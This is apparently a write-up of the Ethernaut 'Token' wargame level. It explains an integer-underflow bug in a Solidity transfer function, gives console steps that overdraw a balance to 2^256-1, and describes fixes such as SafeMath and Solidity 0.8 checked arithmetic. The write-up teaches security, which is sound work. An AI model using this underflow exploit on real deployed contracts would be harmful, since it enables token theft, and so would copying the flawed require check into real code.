# Level 5: Token

**Difficulty:** Easy

**Vulnerability:** Integer underflow on an unsigned integer balance

## Why Use `await` in the Console

The Ethernaut contract functions return Promises, not values directly. A Promise is JavaScript's way of saying "this result is coming, but not yet." Without `await`, the console gives back the Promise object itself instead of the actual value, which looks like `Promise {<pending>, ...}` and is not useful.

Using `await` tells JavaScript to wait for the Promise to resolve before moving on, so I get the real value back.

```js
contract.balanceOf(player)        // returns a Promise object, not the balance
await contract.balanceOf(player)  // waits and returns the actual balance
```

This applies to any contract call that reads from the blockchain, since blockchain reads are asynchronous.

## How it Works

I started with 20 tokens. The contract lets me transfer them to any address:

```solidity
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

The balance is stored as a `uint` (unsigned integer, always zero or positive). The `require` check looks like it guards against transferring more than I have, but it compares a `uint` to `0`. A `uint` is always >= 0, so the check never fails. When I subtract more than my balance, the value does not go negative. It wraps around to `2^256 - 1`.

This is called **integer underflow**. It works like an odometer rolling backwards past zero: instead of going negative, it jumps to the highest possible value.

## Exploit Steps

1. Check my starting balance:
```js
await contract.balanceOf(player)  // returns 20
```

2. Transfer 21 tokens (one more than I have) to a throwaway address:
```js
await contract.transfer("0x0000000000000000000000000000000000000001", 21)
```

3. Confirm the underflow:
```js
(await contract.balanceOf(player)).toString()
// 115792089237316195423570985008687907853269984665640564039457584007913129639935
```

That is `2^256 - 1`, the maximum possible `uint256` value.

4. Submit the instance.

## Key Takeaway

The `require(balances[msg.sender] - _value >= 0)` check is useless. The subtraction already underflowed before the comparison happens, and a `uint` can never be negative anyway. The correct fix is to check inputs before subtracting: `require(balances[msg.sender] >= _value)`.

For pre-0.8.x Solidity, OpenZeppelin's SafeMath library handles this automatically. Calling `a.sub(b)` reverts on underflow. In Solidity 0.8.0 and later, overflow and underflow revert by default with no extra code needed. This class of bug is largely gone in modern contracts but still present in older deployed code.

**Vulnerability category:** Integer Underflow / Arithmetic
